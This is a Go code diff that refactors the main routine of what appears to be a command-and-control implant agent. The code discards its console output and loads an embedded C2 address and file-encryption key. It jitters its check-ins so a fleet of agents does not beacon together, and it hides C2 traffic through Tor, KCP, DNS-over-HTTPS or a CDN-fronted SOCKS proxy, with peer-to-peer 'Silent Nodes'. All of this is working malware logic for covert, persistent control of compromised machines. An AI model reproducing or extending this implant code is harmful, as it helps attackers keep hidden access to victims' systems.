@@ -6,7 +6,6 @@ import (
 	"net"
 	"os"
 	"os/user"
-	"runtime"
 	"strings"
 	"time"
 
@@ -59,57 +58,39 @@ func resetC2Backoff() {
 }
 
 func agent_main() {
-	var err error
 	defer func() {
 		if r := recover(); r != nil {
 			logging.Errorf("agent_main recovered from panic: %v\n%s", r, util.CallStack())
 		}
 	}()
 
-	null_file, err := os.OpenFile(os.DevNull, os.O_WRONLY, 0o644)
+	nullFile, err := os.OpenFile(os.DevNull, os.O_WRONLY, 0o644)
 	if err != nil {
 		logging.Fatalf("%s: %v", os.DevNull, err)
 	}
-	defer null_file.Close()
-	os.Stderr = null_file
-	os.Stdout = null_file
+	defer nullFile.Close()
+	os.Stderr = nullFile
+	os.Stdout = nullFile
 
-	// Check if we're running as a library (CGO build)
-	is_dll := IsDLL()
-
-	// applyRuntimeConfig
+	// Load the embedded runtime config and derive the runtime globals
+	// (CC address, file crypto key).
 	logging.Infof("Applying runtime config...")
-	err = common.InitConfig()
-	if err != nil {
+	if err = common.InitConfig(); err != nil {
 		logging.Fatalf("ApplyRuntimeConfig: %v", err)
 	}
 	util.SetFileCryptoKey([]byte(common.RuntimeConfig.Password))
 
-	if !is_dll {
-		// don't be hasty
-		time.Sleep(time.Duration(util.RandInt(3, 10)) * time.Second)
-	}
+	// Spread out check-ins so a fleet of agents does not beacon in lockstep.
+	time.Sleep(time.Duration(util.RandInt(3, 10)) * time.Second)
 
-	if runtime.GOOS == "linux" {
-		// PATH
-		agentutils.InitializePath()
+	// Normalize PATH and HOME so modules and spawned tools resolve correctly,
+	// regardless of what environment the loader handed us.
+	agentutils.InitializePath()
+	ensureHomeDir()
 
-		// set HOME to correct value
-		setupEnvironment()
-
-		// remove *.downloading files
-		cleanUpDownloadingFiles()
-
-		if is_dll {
-			logging.Infof("%d is invoked by DLL in %d",
-				os.Getpid(), os.Getppid())
-		}
-	}
-
-	// Construct CC address
-	// if CC is behind tor, a proxy is needed
+	// Tor hides the CC behind a local SOCKS proxy; otherwise KCP can carry the
+	// C2 traffic directly.
 	if netutil.IsTor(def.CCAddress) {
-		logging.Infof("CC is on TOR: %s", def.CCAddress)
 		logging.Infof("CC is on TOR (%s), using %s as TOR proxy", def.CCAddress, common.RuntimeConfig.C2TransportProxy)
 	} else if common.RuntimeConfig.UseKCP {
 		// run KCP
@@ -125,25 +106,24 @@ func agent_main() {
 			dns.DoHCache(),
 		)
 		if err != nil {
-			logging.Fatal(err)
+			logging.Fatalf("cannot start DoH resolver: %v", err)
 		}
 	}
 
 	// if user wants to use CDN proxy
-	upper_proxy := common.RuntimeConfig.C2TransportProxy // when using CDNproxy: agent => CDN proxy => upper_proxy => C2
+	upperProxy := common.RuntimeConfig.C2TransportProxy // when using CDNproxy: agent => CDN proxy => upper_proxy => C2
 	if common.RuntimeConfig.CDNProxy != "" {
 		logging.Infof("C2 is behind CDN, using CDNProxy %s", common.RuntimeConfig.CDNProxy)
 		cdnproxyAddr := fmt.Sprintf("socks5://127.0.0.1:%d", util.RandInt(1024, 65535))
-		// DoH server
-		dns := "https://9.9.9.9/dns-query"
+		dohURL := "https://9.9.9.9/dns-query"
 		if common.RuntimeConfig.DoHServer != "" {
-			dns = common.RuntimeConfig.DoHServer
+			dohURL = common.RuntimeConfig.DoHServer
 		}
 		go func() {
 			for !transport.IsProxyOK(cdnproxyAddr, def.CCAddress) {
 				// typically you need to configure AgentProxy manually if agent doesn't have internet
 				// and AgentProxy will be used for websocket connection, then replaced with 10888
-				err := cdn2proxy.StartProxy(strings.Split(cdnproxyAddr, "socks5://")[1], common.RuntimeConfig.CDNProxy, upper_proxy, dns)
+				err := cdn2proxy.StartProxy(strings.Split(cdnproxyAddr, "socks5://")[1], common.RuntimeConfig.CDNProxy, upperProxy, dohURL)
 				if err != nil {
 					logging.Infof("CDN proxy at %s stopped (%v), restarting", cdnproxyAddr, err)
 				}
@@ -152,7 +132,7 @@ func agent_main() {
 		common.RuntimeConfig.C2TransportProxy = cdnproxyAddr
 	}
 
-	// Initialize Windows syscall table (idempotent, safe for concurrent callers)
+	// Initialize the syscall table (idempotent; Windows-only work, no-op elsewhere).
 	if _, err := syscall.GetRuntimeSyscallTable(); err != nil {
 		logging.Errorf("Failed to initialize syscall table: %v", err)
 	}
@@ -223,9 +203,8 @@ func agent_main() {
 
 	isCheckedIn := false
 connect:
-	// check preset CC status URL, if CC is supposed to be offline, take a nap
-	// Preflight Check
-	// Preflight Check — skipped for Silent Nodes (no direct C2 path).
+	// Preflight check: Silent Nodes have no direct C2 path, so they must not
+	// touch the C2 status URL and skip this entirely.
 	isSilentNode := common.RuntimeConfig.IsP2PEnabled && !common.RuntimeConfig.IsDirectC2Enabled
 	if !isSilentNode {
 		if !c2transport.CheckC2Condition(common.RuntimeConfig.C2TransportProxy) {
@@ -315,28 +294,18 @@ connect:
 	goto connect
 }
 
-func setupEnvironment() {
-	logging.Infof("setupEnvironment...")
+func ensureHomeDir() {
+	if os.Getenv("HOME") != "" {
+		return
+	}
 	u, err := user.Current()
 	if err != nil {
-		logging.Infof("Get user info: %v", err)
-	} else {
-		if os.Getenv("HOME") == "" {
-			os.Setenv("HOME", u.HomeDir)
-		}
+		logging.Warningf("cannot resolve current user to set HOME: %v", err)
+		return
 	}
-	def.DefaultShell = "/bin/bash"
-	if runtime.GOOS == "windows" {
-		def.DefaultShell = "elvish"
-	} else if !util.IsFileExist(def.DefaultShell) {
-		def.DefaultShell = "/bin/bash"
-		if !util.IsFileExist(def.DefaultShell) {
-			def.DefaultShell = "/bin/sh"
-		}
+	if err = os.Setenv("HOME", u.HomeDir); err != nil {
+		logging.Warningf("cannot set HOME to %s: %v", u.HomeDir, err)
+		return
 	}
-}
-
-func cleanUpDownloadingFiles() {
-	logging.Infof("cleanUpDownloadingFiles...")
-	// No more AgentRoot to clean up
+	logging.Debugf("HOME set to %s", u.HomeDir)
 }
